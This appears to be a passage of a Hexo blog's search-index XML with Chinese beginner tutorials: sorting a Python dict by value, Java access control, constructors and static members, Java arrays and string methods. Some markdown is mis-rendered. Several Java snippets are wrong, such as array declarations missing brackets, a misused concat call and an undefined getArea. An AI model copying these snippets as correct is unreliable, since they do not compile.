{‘a’:24,’g’:52,’i’:12,’k’:33}请按value值进行排序?</h3><pre class=" language-python"><code class="language-python">d<span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">:</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">:</span><span class="token number">33</span><span class="token punctuation">}</span>a <span class="token operator">=</span> d<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> af <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span> f<span class="token punctuation">(</span>a<span class="token punctuation">)</span>b <span class="token operator">=</span> sorted<span class="token punctuation">(</span>d<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span> b</code></pre><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'a'</span>, 24<span class="token punctuation">)</span>, <span class="token punctuation">(</span><span class="token string">'i'</span>, 12<span class="token punctuation">)</span>, <span class="token punctuation">(</span><span class="token string">'k'</span>, 33<span class="token punctuation">)</span>, <span class="token punctuation">(</span><span class="token string">'g'</span>, 52<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'i'</span>, 12<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'i'</span>, 12<span class="token punctuation">)</span>, <span class="token punctuation">(</span><span class="token string">'a'</span>, 24<span class="token punctuation">)</span>, <span class="token punctuation">(</span><span class="token string">'k'</span>, 33<span class="token punctuation">)</span>, <span class="token punctuation">(</span><span class="token string">'g'</span>, 52<span class="token punctuation">)</span><span class="token punctuation">]</span></code></pre><p>  lambda是一个隐函数，是固定写法，不要写成别的单词；x表示列表中的一个元素，在这里，表示一个元组，x只是临时起的一个名字，你可以使用任意的名字；x[0]表示元组里的第一个元素，当然第二个元素就是x[1]</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java面向对象</title>
      <link href="/2019/01/31/java-mian-xiang-dui-xiang/"/>
      <url>/2019/01/31/java-mian-xiang-dui-xiang/</url>
      
        <content type="html"><![CDATA[<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><blockquote><h4 id="MethodOverloading-java"><a href="#MethodOverloading-java" class="headerlink" title="MethodOverloading.java"></a>MethodOverloading.java</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>public class MethodOverloading {<br>    void receive(int i){<br>        System.out.println(“接收到一个int参数”);<br>        System.out.println(“i = “+i);<br>    }<br>    void receive(int x,int y){<br>        System.out.println(“接收到两个int参数。”);<br>        System.out.printf(“x = %d,y = %d \n”,x,y);<br>//        System.out.println();<br>    }</p><pre><code>int receive(double x,double y){    System.out.println(&quot;接收到两个double参数。&quot;);    System.out.printf(&quot;x = %f , y = %f \r&quot;,x,y);    return  0;}</code></pre><p>}</p><pre><code>&gt; ####  mo_class.java```javapackage basic_grammar;public class mo_class {    public static void main(String[] args){        MethodOverloading mo = new MethodOverloading();        mo.receive(1);        mo.receive(2,3);        mo.receive(2.0,3.3);    }}</code></pre><pre><code>接收到一个int参数i = 1接收到两个int参数。x = 2,y = 3 接收到两个double参数。x = 2.000000 , y = 3.300000</code></pre><h2 id="封装性与访问控制"><a href="#封装性与访问控制" class="headerlink" title="封装性与访问控制"></a>封装性与访问控制</h2><blockquote><h4 id="Java-面向对象的封装性是通过对成员变量和方法进行访问控制实现的，访问控制分为-4-个等级：私有、默认、保护和公有"><a href="#Java-面向对象的封装性是通过对成员变量和方法进行访问控制实现的，访问控制分为-4-个等级：私有、默认、保护和公有" class="headerlink" title="Java 面向对象的封装性是通过对成员变量和方法进行访问控制实现的，访问控制分为 4 个等级：私有、默认、保护和公有"></a>Java 面向对象的封装性是通过对成员变量和方法进行访问控制实现的，访问控制分为 4 个等级：私有、默认、保护和公有</h4><table><thead><tr><th align="center">控制等级</th><th align="center">同一个类</th><th align="center">同一个包</th><th align="center">不同包的子类</th><th align="center">不同包非子类</th></tr></thead><tbody><tr><td align="center">私有</td><td align="center">yes</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">默认</td><td align="center">yes</td><td align="center">yes</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">保护</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td><td align="center"></td></tr><tr><td align="center">公有</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td></tr></tbody></table></blockquote><h3 id="私有级别"><a href="#私有级别" class="headerlink" title="私有级别"></a>私有级别</h3><blockquote><h4 id="私有级别的关键词是private，私有级别的成员变量和方法只能在其所在的类中自由使用，不允许其他类自由访问。私有级别限制性最高。"><a href="#私有级别的关键词是private，私有级别的成员变量和方法只能在其所在的类中自由使用，不允许其他类自由访问。私有级别限制性最高。" class="headerlink" title="私有级别的关键词是private，私有级别的成员变量和方法只能在其所在的类中自由使用，不允许其他类自由访问。私有级别限制性最高。"></a>私有级别的关键词是private，私有级别的成员变量和方法只能在其所在的类中自由使用，不允许其他类自由访问。私有级别限制性最高。</h4><h4 id="PrivateClass-java"><a href="#PrivateClass-java" class="headerlink" title="PrivateClass.java"></a>PrivateClass.java</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>public class PrivateClass {<br>    private int x ;<br>    public PrivateClass(){<br>        x = 5 ;<br>    }<br>    private void printX() {<br>        System.out.println(“Values of x is “+x);<br>    }<br>}</p><pre><code>&gt; #### PC_class```javapackage basic_grammar;public class PC_class {    public static void main(String[] args){        PrivateClass p;        p = new PrivateClass();        p.printX();    }}</code></pre><pre><code>Error:(7, 10) java: printX() 在 basic_grammar.PrivateClass 中是 private 访问控制</code></pre><h4 id="p-printX-是私有的所以无法调用。"><a href="#p-printX-是私有的所以无法调用。" class="headerlink" title="p.printX();是私有的所以无法调用。"></a>p.printX();是私有的所以无法调用。</h4><h3 id="默认级别"><a href="#默认级别" class="headerlink" title="默认级别"></a>默认级别</h3><blockquote><h4 id="默认级别没有关键词，也就是没有访问修饰符，在不同包的类中是不允许被访问的。"><a href="#默认级别没有关键词，也就是没有访问修饰符，在不同包的类中是不允许被访问的。" class="headerlink" title="默认级别没有关键词，也就是没有访问修饰符，在不同包的类中是不允许被访问的。"></a>默认级别没有关键词，也就是没有访问修饰符，在不同包的类中是不允许被访问的。</h4><h4 id="DefaultClass-java"><a href="#DefaultClass-java" class="headerlink" title="DefaultClass.java"></a>DefaultClass.java</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>public class DefaultClass {<br>    int x;<br>    public DefaultClass(){<br>        x = 100;<br>    }<br>    void printX(){<br>        System.out.println(“x = “+x);<br>    }<br>}</p><pre><code>&gt; #### DC_class.java```javapackage basic_grammar;public class DC_class {    public static void main(String[] args){        DefaultClass p;        p = new DefaultClass();        p.printX();    }}</code></pre><pre><code>x = 100</code></pre><h4 id="若在不同包体去编译执行，将会报错。"><a href="#若在不同包体去编译执行，将会报错。" class="headerlink" title="若在不同包体去编译执行，将会报错。"></a>若在不同包体去编译执行，将会报错。</h4><h3 id="公有级别"><a href="#公有级别" class="headerlink" title="公有级别"></a>公有级别</h3><blockquote><h4 id="公有级别的关键词是-public，公有级别的成员常量和方法可以再任何场合被直接调用。"><a href="#公有级别的关键词是-public，公有级别的成员常量和方法可以再任何场合被直接调用。" class="headerlink" title="公有级别的关键词是 public，公有级别的成员常量和方法可以再任何场合被直接调用。"></a>公有级别的关键词是 public，公有级别的成员常量和方法可以再任何场合被直接调用。</h4><h4 id="PublicClass-java"><a href="#PublicClass-java" class="headerlink" title="PublicClass.java"></a>PublicClass.java</h4><pre class=" language-java"><code class="language-java">  <span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>public class PublicClass {<br>    public int x ;<br>    public PublicClass(){<br>        x = 100;<br>    }<br>    public void printX(){<br>        System.out.println(“x = “+x);<br>    }<br>}</p><pre><code>  &gt; ####  PublicClass_class.java  ```java  package basic_grammar.basic_grammar;import basic_grammar.PublicClass;public class PublicClass_class {    public static void main(String[] args){        PublicClass p;        p = new PublicClass();        p.printX();    }}</code></pre><pre><code>  x = 100</code></pre><h3 id="保护级别"><a href="#保护级别" class="headerlink" title="保护级别"></a>保护级别</h3><blockquote><h4 id="保护级别的关键词protected，保护级别在同一包中完全与默认访问级别一样，但不同包中子类可继承父类中的protected的变量和方法。"><a href="#保护级别的关键词protected，保护级别在同一包中完全与默认访问级别一样，但不同包中子类可继承父类中的protected的变量和方法。" class="headerlink" title="保护级别的关键词protected，保护级别在同一包中完全与默认访问级别一样，但不同包中子类可继承父类中的protected的变量和方法。"></a>保护级别的关键词protected，保护级别在同一包中完全与默认访问级别一样，但不同包中子类可继承父类中的protected的变量和方法。</h4><h4 id="ProtectedClass-java"><a href="#ProtectedClass-java" class="headerlink" title="ProtectedClass.java"></a>ProtectedClass.java</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>public class ProtectedClass {<br>    protected int x;<br>    public ProtectedClass(){<br>        x = 100;<br>    }<br>    protected void printX(){<br>        System.out.println(“value of is “+x);<br>    }<br>}</p><pre><code>&gt; ####  ProtectedClass_class.java```javapackage basic_grammar;public class ProtectedClass_class {    public static void main(String[] args){        ProtectedClass p;        p = new ProtectedClass();        p.printX();    }}</code></pre><h4 id="同一个包下保护级别和默认级别没有区别，不同包下也无法直接访问printX。需要在不同包内继承ProtectedClass类。"><a href="#同一个包下保护级别和默认级别没有区别，不同包下也无法直接访问printX。需要在不同包内继承ProtectedClass类。" class="headerlink" title="同一个包下保护级别和默认级别没有区别，不同包下也无法直接访问printX。需要在不同包内继承ProtectedClass类。"></a>同一个包下保护级别和默认级别没有区别，不同包下也无法直接访问printX。需要在不同包内继承ProtectedClass类。</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">.</span>basic_grammar<span class="token punctuation">;</span><span class="token keyword">import</span> basic_grammar<span class="token punctuation">.</span>ProtectedClass<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProtectedClass_class</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SubClass</span> <span class="token keyword">extends</span> <span class="token class-name">ProtectedClass</span><span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">diskplay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printX</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre><code>value of is 100</code></pre><h4 id="不同包中SubClass从ProtectedClass类中继承了printX-方法和x实例变量。"><a href="#不同包中SubClass从ProtectedClass类中继承了printX-方法和x实例变量。" class="headerlink" title="不同包中SubClass从ProtectedClass类中继承了printX()方法和x实例变量。"></a>不同包中SubClass从ProtectedClass类中继承了printX()方法和x实例变量。</h4><blockquote><h4 id="访问成员有两种方式：一种是调用，通过类或对象调用成员，如p-printX-另一种是继承，子类继承父类的成员变量和方法。"><a href="#访问成员有两种方式：一种是调用，通过类或对象调用成员，如p-printX-另一种是继承，子类继承父类的成员变量和方法。" class="headerlink" title="访问成员有两种方式：一种是调用，通过类或对象调用成员，如p.printX().另一种是继承，子类继承父类的成员变量和方法。"></a>访问成员有两种方式：一种是调用，通过类或对象调用成员，如p.printX().另一种是继承，子类继承父类的成员变量和方法。</h4></blockquote><h3 id="静态变量和静态方法"><a href="#静态变量和静态方法" class="headerlink" title="静态变量和静态方法"></a>静态变量和静态方法</h3><blockquote><h4 id="Account-java"><a href="#Account-java" class="headerlink" title="Account.java"></a>Account.java</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>public class Account {<br>    double mount = 0.0;<br>    String owner ;<br>    static double interestRate = 0.0668;<br>    public static double interestBy(double amt){<br>        return interestRate * amt;<br>    }<br>    public String messageWith(double amt){<br>        double interest = Account.interestBy(amt);<br>        StringBuilder sb = new StringBuilder();<br>        sb.append(owner).append(“的利息是”).append(interest);<br>        return sb.toString();<br>    }<br>}</p><pre><code>&gt; #### Account_class```javapackage basic_grammar;public class Account_class {    public static void main(String[] args){        System.out.println(Account.interestRate);        System.out.println(Account.interestBy(1000));        Account myaccount = new Account();        myaccount.mount =  1000000;        myaccount.owner =  &quot;Tony&quot;;        System.out.println(myaccount.messageWith(1000));        System.out.println(myaccount.interestRate);    }}</code></pre><pre><code>0.066866.8Tony的利息是66.80.0668</code></pre><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><blockquote><h4 id="实例化可生产对象，实例方法就是对象方法-，实例变量就是对象属性。一个对象的周期包括三个阶段：创建，使用和销毁。"><a href="#实例化可生产对象，实例方法就是对象方法-，实例变量就是对象属性。一个对象的周期包括三个阶段：创建，使用和销毁。" class="headerlink" title="实例化可生产对象，实例方法就是对象方法 ，实例变量就是对象属性。一个对象的周期包括三个阶段：创建，使用和销毁。"></a>实例化可生产对象，实例方法就是对象方法 ，实例变量就是对象属性。一个对象的周期包括三个阶段：创建，使用和销毁。</h4></blockquote><h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><blockquote><h4 id="创建对象包括两个步骤：声明和实例化。"><a href="#创建对象包括两个步骤：声明和实例化。" class="headerlink" title="创建对象包括两个步骤：声明和实例化。"></a>创建对象包括两个步骤：声明和实例化。</h4></blockquote><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><blockquote><h5 id="声明对象与声明普通变量没有什么区别。"><a href="#声明对象与声明普通变量没有什么区别。" class="headerlink" title="声明对象与声明普通变量没有什么区别。"></a>声明对象与声明普通变量没有什么区别。</h5><pre><code>type objectName;</code></pre></blockquote><h5 id="type是引用类型，即类，接口和数组。"><a href="#type是引用类型，即类，接口和数组。" class="headerlink" title="type是引用类型，即类，接口和数组。"></a>type是引用类型，即类，接口和数组。</h5><pre><code>String  name;</code></pre><h5 id="该语句声明了字符串类型对象name。可以声明并不为对象分配内存空间，而只是分配一个引用。"><a href="#该语句声明了字符串类型对象name。可以声明并不为对象分配内存空间，而只是分配一个引用。" class="headerlink" title="该语句声明了字符串类型对象name。可以声明并不为对象分配内存空间，而只是分配一个引用。"></a>该语句声明了字符串类型对象name。可以声明并不为对象分配内存空间，而只是分配一个引用。</h5><h4 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h4><blockquote><h5 id="实例化分为两个阶段：为对象分配内存空间和初始化对象。首先使用new运算符为对象分配内存空间，然后再调用构造方法初始化对象。"><a href="#实例化分为两个阶段：为对象分配内存空间和初始化对象。首先使用new运算符为对象分配内存空间，然后再调用构造方法初始化对象。" class="headerlink" title="实例化分为两个阶段：为对象分配内存空间和初始化对象。首先使用new运算符为对象分配内存空间，然后再调用构造方法初始化对象。"></a>实例化分为两个阶段：为对象分配内存空间和初始化对象。首先使用new运算符为对象分配内存空间，然后再调用构造方法初始化对象。</h5><pre class=" language-java"><code class="language-java">String name <span class="token punctuation">;</span>name <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><h3 id="空对象"><a href="#空对象" class="headerlink" title="空对象"></a>空对象</h3><blockquote><h4 id="一个引用变量没有通过new分配内存空间，这个对象就是空对象，java使用null表示空对象。"><a href="#一个引用变量没有通过new分配内存空间，这个对象就是空对象，java使用null表示空对象。" class="headerlink" title="一个引用变量没有通过new分配内存空间，这个对象就是空对象，java使用null表示空对象。"></a>一个引用变量没有通过new分配内存空间，这个对象就是空对象，java使用null表示空对象。</h4><pre><code>String name = null;name = &quot;Hello World&quot;;</code></pre><h4 id="引用变量默认值是-null。当试图调用一个空对象的实例变量或实例方法时，会抛出空指针异常-NullPointerException"><a href="#引用变量默认值是-null。当试图调用一个空对象的实例变量或实例方法时，会抛出空指针异常-NullPointerException" class="headerlink" title="引用变量默认值是 null。当试图调用一个空对象的实例变量或实例方法时，会抛出空指针异常 NullPointerException"></a>引用变量默认值是 null。当试图调用一个空对象的实例变量或实例方法时，会抛出空指针异常 NullPointerException</h4></blockquote><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><blockquote><h4 id="构造方法名必须与类名相同。"><a href="#构造方法名必须与类名相同。" class="headerlink" title="构造方法名必须与类名相同。"></a>构造方法名必须与类名相同。</h4><h4 id="构造方法没有任何返回值。"><a href="#构造方法没有任何返回值。" class="headerlink" title="构造方法没有任何返回值。"></a>构造方法没有任何返回值。</h4><h4 id="构造方法只能与new结合使用。"><a href="#构造方法只能与new结合使用。" class="headerlink" title="构造方法只能与new结合使用。"></a>构造方法只能与new结合使用。</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>public class Rectangle {<br>    int width;<br>    int height;<br>    int area;<br>    public Rectangle(int w,int h){<br>        width = w ;<br>        height = h ;<br>        area = getArea(w,h);<br>    }<br>}</p><pre><code>### 默认构造方法&gt; #### 默认构造方法的方法体内无任何语句，也就不能够初始化成员变量了。### 构造方法重载&gt; #### 在一个类中可以多个构造方法，他们具有相同的名字，参数列表不同，所以他们之间一定是重载关系。```javapackage basic_grammar;import java.util.Date;public class Person {    private String name ;    private int age ;    private Date birthday ;    public Person(String n,int a,Date b){        name = n;        age = a ;        birthday = b ;    }    public  Person(String n ,int a){        name = n ;        age = a ;    }    public Person(String n, Date b){        name = n ;        age = 30 ;        birthday = b ;    }    public  Person(String n){        name = n ;        age = 30;    }    public String  getinfo(){        StringBuilder sb = new StringBuilder();        sb.append(&quot;名字：&quot;).append(name).append(&quot;\n&quot;);        sb.append(&quot;年龄：&quot;).append(age).append(&quot;\n&quot;);        sb.append(&quot;出生日：&quot;).append(birthday).append(&quot;\n&quot;);        return  sb.toString();    }}</code></pre><h3 id="构造方法封装"><a href="#构造方法封装" class="headerlink" title="构造方法封装"></a>构造方法封装</h3><blockquote><h4 id="构造方法可以封装，访问级别和普通方法一样。"><a href="#构造方法可以封装，访问级别和普通方法一样。" class="headerlink" title="构造方法可以封装，访问级别和普通方法一样。"></a>构造方法可以封装，访问级别和普通方法一样。</h4></blockquote><h3 id="this关键词"><a href="#this关键词" class="headerlink" title="this关键词"></a>this关键词</h3><blockquote><h4 id="this指向对象本身，一个类可以通过this来获得一个代表它自身的对象变量。"><a href="#this指向对象本身，一个类可以通过this来获得一个代表它自身的对象变量。" class="headerlink" title="this指向对象本身，一个类可以通过this来获得一个代表它自身的对象变量。"></a>this指向对象本身，一个类可以通过this来获得一个代表它自身的对象变量。</h4><h4 id="调用实例变量。"><a href="#调用实例变量。" class="headerlink" title="[ ]调用实例变量。"></a>[ ]调用实例变量。</h4><h4 id="调用实例方法。"><a href="#调用实例方法。" class="headerlink" title="[ ]调用实例方法。"></a>[ ]调用实例方法。</h4><h4 id="调用其他构造方法。"><a href="#调用其他构造方法。" class="headerlink" title="[ ]调用其他构造方法。"></a>[ ]调用其他构造方法。</h4></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java数组</title>
      <link href="/2019/01/30/java-shu-zu/"/>
      <url>/2019/01/30/java-shu-zu/</url>
      
        <content type="html"><![CDATA[<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><h3 id="数组初始化"><a href="#数组初始化" class="headerlink" title="数组初始化"></a>数组初始化</h3><h4 id="静态数组初始化"><a href="#静态数组初始化" class="headerlink" title="静态数组初始化"></a>静态数组初始化</h4><blockquote><p> 静态数组初始化是将元素放入大括号中。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> intarray<span class="token punctuation">;</span>intarray <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></blockquote><h4 id="动态数组初始化"><a href="#动态数组初始化" class="headerlink" title="动态数组初始化"></a>动态数组初始化</h4><blockquote><p>  动态数组初始化是由new运算符分配长度的内存空间。</p><pre><code>int array;array = new int[4];array[0] = 1;array[1] = 2;array[2] = 3;array[3] = 4; </code></pre></blockquote><h3 id="数组合并"><a href="#数组合并" class="headerlink" title="数组合并"></a>数组合并</h3><blockquote><p>  数组的长度是不可变化的，想要将两个数组合并。需要创建一个新的数组，新数组的长度是两个数组长度的和。然后将两个数组的内容导入新的数组中。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>public class merge {<br>    public static void main(String[] args){<br>        int array1[] = {1,2,3,4,5,6};<br>        int array2[] = {7,8,9};<br>        int array[] = new int[array1.length+array2.length];</p><pre><code>    for (int i = 0;i&lt;array.length;i++){        if (i&lt;array1.length){            array[i] = array1[i];        }else {            array[i] = array2[i-array1.length];        }    }    System.out.println(&quot;合并后：&quot;);    for (int item : array){        System.out.printf(&quot;%d&quot;,item);    }}</code></pre><p>}</p><pre><code></code></pre><p>合并后：<br>123456789</p><pre><code>##  二维数组### 二维数组声明&gt;  二维数组声明需要两个zhong&#39;ku&#39;y中括号&gt;  元素数据类型[][] 数组变量名;&gt;  元素数据类型 数组变量名[][];&gt;  元素数据类型[] 数组变量名[];```bashint[][] array1;int array2[][];int[] array3[];</code></pre><h3 id="二维数组初始化"><a href="#二维数组初始化" class="headerlink" title="二维数组初始化"></a>二维数组初始化</h3><h4 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h4><pre class=" language-bash"><code class="language-bash">int array<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">{</span>1,2,3<span class="token punctuation">}</span>,<span class="token punctuation">{</span>4,5,6<span class="token punctuation">}</span>,<span class="token punctuation">{</span>7,8,9<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p> 上述是创建并初始化了3x3的二维数组。</p><h4 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h4><blockquote><p> new 元素数据类型[高维数组长度][低维数组长度]   高维数组就是最外层的数组，低维数组是每个元素的数组。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> basic_grammar<span class="token punctuation">;</span></code></pre></blockquote><p>public class Two_dimensional_array {<br>    public static void main(String[] args){<br>        int[][] array = {<br>                {1,2,3},<br>                {4,5,6},<br>                {7,8,9}<br>        };<br>        double[][] doublearray = new double[3][3];<br>        System.out.println(array.length);<br>        for (int i = 0;i &lt; array.length;i++){<br>            for (int j = 0;j &lt; array[i].length;j++){<br>                doublearray[i][j] = Math.sqrt(array[i][j]);<br>            }<br>        }<br>        for (int i = 0;i &lt; doublearray.length;i++){<br>            for (int j = 0;j &lt; doublearray[i].length;j++){<br>                System.out.printf(“[%d][%d] =  %f”,i,j,doublearray[i][j]);<br>                System.out.print(“\t”);<br>            }<br>            System.out.println();<br>        }<br>    }<br>}</p><pre><code></code></pre><p>3<br>[0][0] =  1.000000    [0][1] =  1.414214    [0][2] =  1.732051<br>[1][0] =  2.000000    [1][1] =  2.236068    [1][2] =  2.449490<br>[2][0] =  2.645751    [2][1] =  2.828427    [2][2] =  3.000000 </p><pre><code>### 不规则数组#### 不规则数组初始化</code></pre><p>int[][] array = new  int[4][];<br>array[0] = new int[2];<br>array[1] = new int[1];<br>array[2] = new int[5];<br>array[3] = new int[2];</p><pre><code>```javapackage basic_grammar;public class irregular {    public static void main(String[] args){        int[][] array = new int[3][];        array[0] = new int[2];        array[1] = new int[3];        array[2] = new int[2];        for (int i = 0;i &lt; array.length;i ++){            for (int j = 0;j &lt; array[i].length;j++){                array[i][j] = i+j;            }        }        for (int[] x : array){            for (int y : x){                System.out.print(y);                System.out.print(&quot;\t&quot;);            }            System.out.println();        }    }}</code></pre><pre><code>0    1    1    2    3    2    3    </code></pre><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="Java中的字符串"><a href="#Java中的字符串" class="headerlink" title="Java中的字符串"></a>Java中的字符串</h3><blockquote><p> Java SE 提供了三个字符串类：String,StringBuffer和StringBuilder。String是不可变字符串，StringBuffer和StringBuilder是可变字符串。</p></blockquote><h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><blockquote><p> String虽然是不可变字符串，但是也可以进行拼接只是会产生一个新的对象。String字符串拼接可以使用+或者String的concat方法。</p><pre><code>String s1 = &quot;Hello&quot;;String s2 = s1 + &quot; &quot;;String s3 = s2 + &quot;world!&quot;;System.out.println(s3);</code></pre></blockquote><p>String s4 = “Hello”;<br>String s5 = s4 + concat(“ “)+concat(“World!”);<br>System.out.println(s5);</p><pre><code>### 字符串查找&gt;  String类中提供了indexOf和lastIndexOf方法用于查找字符或字符串。，返回值是查找的字符或字符串的位置，-1表示未找到。-  int indexOf(int ch)从前往后搜索字符ch，返回第一次查找到字符ch所在处的索引。-  int indexOf(int ch,int fromIndex):从指定的索引开始从前往后搜索字符ch，返回第一次查找到的字符。-  int indexOf(String str):从前往后搜索字符串str，返回第一次查找到字符串的索引位置。-  int indexOf(String str,int fromIndex): 从指定的索引 开始从前往后查找字符串，返回第一次查找到字符串索引位置。-  int lastIndexOf(int ch)：从后往前搜索字符串，返回第一次查找到字符所在处。-  int lastIndexOf(int ch，int fromIndex)：从指定索引开始从后往前查找字符。返回第一次查找到字符索引所在位置。-  int lastIndexOf(String str)：从后往前搜索字符串str，返回第一次 查找字符串所在位置。-  int lastIndexOf(String str,  int fromIndex)：从指定索引开始从后往前搜索，返回第一次字符串所在处索引。```javapackage basic_grammar;public class java_str {    public static void main(String[] args){        String sourceStr =  &quot;There is a string accessing example.&quot;;        int len = sourceStr.length();        char ch = sourceStr.charAt(16);        int firstchart1 = sourceStr.indexOf(&#39;r&#39;);        int lastchart1 = sourceStr.lastIndexOf(&#39;r&#39;);        int firststr1 = sourceStr.indexOf(&quot;ing&quot;);        int laststr1 = sourceStr.lastIndexOf(&quot;ing&quot;);        int firstchrat2 = sourceStr.indexOf(&#39;e&#39;,15);        int lastchart2 = sourceStr.lastIndexOf(&#39;e&#39;,15);        int firststr2 = sourceStr.indexOf(&quot;ing&quot;,5);        int laststr2 = sourceStr.lastIndexOf(&quot;ing&quot;,5);        System.out.println(&quot;原始数据：&quot;+sourceStr);        System.out.println(&quot;字符串长度：&quot;+len);        System.out.println(&quot;索引16的字符：&quot;+ch);        System.out.println(&quot;字符r从前往后，所在索引位置：&quot;+firstchart1);        System.out.println(&quot;字符r从后往前，所在索引位置：&quot;+lastchart1);        System.out.println(&quot;字符串ing从前往后，所在索引位置：&quot;+firststr1);        System.out.println(&quot;字符串ing从后往前，所在索引位置：&quot;+laststr1);        System.out.println(&quot;索引从15开始，从前往后搜索e字符，所在索引位置：&quot;+firstchrat2);        System.out.println(&quot;索引从15开始，从后往前搜索e字符，所在索引位置：&quot;+lastchart2);        System.out.println(&quot;索引从5开始，从前往后搜索ing字符串，所在索引位置：&quot;+firststr2);        System.out.println(&quot;索引从5开始，从后往前搜索ing字符串，所在索引位置：&quot;+laststr2);    }}</code></pre><pre><code>原始数据：There is a string accessing example.字符串长度：36索引16的字符：g字符r从前往后，所在索引位置：3字符r从后往前，所在索引位置：13字符串ing从前往后，所在索引位置：14字符串ing从后往前，所在索引位置：24索引从15开始，从前往后搜索e字符，所在索引位置：21索引从15开始，从后往前搜索e字符，所在索引位置：4索引从5开始，从前往后搜索ing字符串，所在索引位置：14索引从5开始，从后往前搜索ing字符串，所在索引位置：-1</code></pre><h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><blockquote><h4 id="字符串比较常见操作，包括比较大小，比较相等，比较前缀和后缀等"><a href="#字符串比较常见操作，包括比较大小，比较相等，比较前缀和后缀等" class="headerlink" 